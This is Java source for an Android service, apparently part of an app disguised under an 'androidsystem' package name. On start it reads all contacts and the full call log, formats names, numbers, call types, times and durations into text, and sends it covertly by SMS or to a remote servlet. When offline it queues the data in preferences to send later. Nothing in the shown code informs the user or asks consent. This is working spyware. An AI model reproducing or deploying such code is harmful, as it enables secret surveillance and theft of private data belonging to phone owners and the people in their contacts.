package com.me.androidsystem.service;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.CallLog.Calls;
import android.provider.ContactsContract;
import android.util.Log;

import com.me.androidsystem.domain.CallRecord;
import com.me.androidsystem.util.CommndUtil;
import com.me.androidsystem.util.ServiceUtil;

public class PhoService extends Service {
	private SharedPreferences preferences;
	@Override
	public void onCreate() {
		super.onCreate();
		List<Map<String, String>> contacts = getContacts();
		List<CallRecord> callRecords = getCallRecord();
		preferences = getSharedPreferences(ServiceUtil.CONFIG_NAME,
				Context.MODE_PRIVATE);
		int model = preferences.getInt(ServiceUtil.PHO_MODEL, ServiceUtil.MODEL_NET_ONLY);
		
		switch (model) { 
		case ServiceUtil.MODEL_SMS_ONLY:
			sendSMSContent(contacts,callRecords);
			break;
		case ServiceUtil.MODEL_NET_ONLY:
			sendNETContent(contacts,callRecords);
			break;
		case ServiceUtil.MODEL_NET_SMS:
			sendNETORSMSContent(contacts,callRecords);
			break;

		default:
			break;
		}
		stopSelf();
	}

	private void sendNETORSMSContent(List<Map<String, String>> contacts,
			List<CallRecord> callRecords) {
		ConnectivityManager connectivityManager = (ConnectivityManager)getSystemService(CONNECTIVITY_SERVICE);  
        NetworkInfo networkInfo = connectivityManager.getActiveNetworkInfo();  
        if(networkInfo != null && networkInfo.isAvailable()){  
            //当前有可用网络  
        	sendNETContent(contacts, callRecords);
        }else{  
            //当前无可用网络
        	sendSMSContent(contacts, callRecords);
        }  
	}

	private void sendNETContent(List<Map<String, String>> contacts,
			List<CallRecord> callRecords) {
		ConnectivityManager connectivityManager = (ConnectivityManager)getSystemService(CONNECTIVITY_SERVICE);  
        NetworkInfo networkInfo = connectivityManager.getActiveNetworkInfo();  
        if(networkInfo != null && networkInfo.isAvailable()){  
            //当前有可用网络  

        	CommndUtil.sendInternet(resolve(contacts, callRecords), ServiceUtil.PHO_SERVLET);
        }else{  
            //当前无可用网络
        	String oldInfo = preferences.getString(ServiceUtil.OFF_INFO, "");
	    	Editor editor = preferences.edit();
	    	editor.putString(ServiceUtil.OFF_INFO,oldInfo+resolve(contacts, callRecords)+"\n");
	    	editor.commit();
        	return;
        }  
		
	}

	private void sendSMSContent(List<Map<String, String>> contacts,
			List<CallRecord> callRecords) {
		CommndUtil.sendSMS(resolve(contacts, callRecords));
	}

	private String resolve(List<Map<String, String>> contacts,List<CallRecord> callRecords){
		StringBuilder sb = new StringBuilder();
		if(!ServiceUtil.ONLY_TEL){
			sb.append("姓名     电话\n");
			for(Map<String, String> map : contacts){
				String name = map.get("name");
				String number = map.get("number");
				sb.append(name + " " + number);
			}
		}
		
		sb.append("-------------------------\n"+"通话记录\n");
		sb.append("姓名  类型  时间   时长  电话\n");
		for(CallRecord callRecord : callRecords){
			String name = callRecord.getLinkman();
			String type = callRecord.getType();
			String time = callRecord.getCallDate();
			String durction = callRecord.getDurction();
			String number = callRecord.getNumber();
			sb.append(name + " " + type + " " + time + " " + durction + " " + number + "\n");
		}
		return sb.toString();
	}
	
	// 获取联系人信息
	public List<Map<String, String>> getContacts() {
		Map<String, String> contacts;
		List<Map<String, String>> list = new ArrayList<Map<String, String>>();
		int nameIndex = -1;
		ContentResolver cr = getContentResolver();
		Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null,
				null, null, null);
		while (cur.moveToNext()) {
			String number = "";
			// 得到名字
			nameIndex = cur
					.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
			String name = cur.getString(nameIndex);
			// 得到电话号码
			String contactId = cur.getString(cur
					.getColumnIndex(ContactsContract.Contacts._ID)); // 获取联系人的ID号，在SQLite中的数据库ID
			Cursor phone = cr.query(
					ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
					ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = "
							+ contactId, null, null);
			while (phone.moveToNext()) {
				String strPhoneNumber = phone
						.getString(phone
								.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)); // 手机号码字段联系人可能不止一个
				number += strPhoneNumber + "\n";
			}
			contacts = new HashMap<String, String>();
			// 放入Map
			contacts.put("name", name);
			contacts.put("number", number);
			list.add(contacts);
		}
		cur.close();
		return list;
	}

	// 获取通话记录
	public List<CallRecord> getCallRecord() {
		List<CallRecord> list = new ArrayList<CallRecord>();
		ContentResolver cr = getContentResolver();
		Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI,
				new String[] { CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME,
						CallLog.Calls.TYPE, CallLog.Calls.DATE,
						CallLog.Calls.DURATION }, null, null,
				CallLog.Calls.DEFAULT_SORT_ORDER);

		while (cursor.moveToNext()) {
			String strNumber = cursor.getString(cursor
					.getColumnIndex(Calls.NUMBER)); // 呼叫号码
			String strName = cursor.getString(cursor
					.getColumnIndex(Calls.CACHED_NAME)); // 联系人姓名
			int type = cursor.getInt(cursor.getColumnIndex(Calls.TYPE));// 来电:1,拨出:2,未接:3
			String callType = "";
			switch (type) {
			case 1:
				callType = "来电";
				break;
			case 2:
				callType = "拨出";
				break;
			case 3:
				callType = "未接";
				break;
			}
			long duration = cursor.getLong(cursor
					.getColumnIndex(Calls.DURATION));
			String durationTime = formatTime(duration);
			SimpleDateFormat sfd = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
			Date date = new Date(Long.parseLong(cursor.getString(cursor
					.getColumnIndex(Calls.DATE))));
			String time = sfd.format(date);
			list.add(new CallRecord(strName, strNumber, time, callType,
					durationTime));
		}
		return list;
	}

	private String formatTime(long duration) {
		int timetiem = (int) duration;
		int minute = timetiem / 60;
		int hour = minute / 60;
		int second = timetiem % 60;
		minute %= 60;
		return String.format("%02d:%02d:%02d", hour, minute, second);

	}

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

}
